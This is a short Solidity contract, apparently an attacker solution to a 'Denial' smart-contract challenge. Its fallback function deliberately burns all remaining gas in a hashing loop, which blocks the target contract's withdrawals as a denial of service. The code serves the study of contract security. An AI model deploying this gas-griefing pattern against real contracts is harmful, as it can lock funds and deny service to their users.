pragma solidity ^0.6.0;

import "./Denial.sol";

import "hardhat/console.sol";

contract Denier {
    address payable denialAddress;
    bytes32 h = bytes32(uint(1));

    constructor(address payable _denialAddress) public {
        denialAddress = _denialAddress;
    }

    fallback() external payable {
        console.log(gasleft());
        while(gasleft() > 0) {
            h = keccak256(abi.encode(h));
        }
    }
}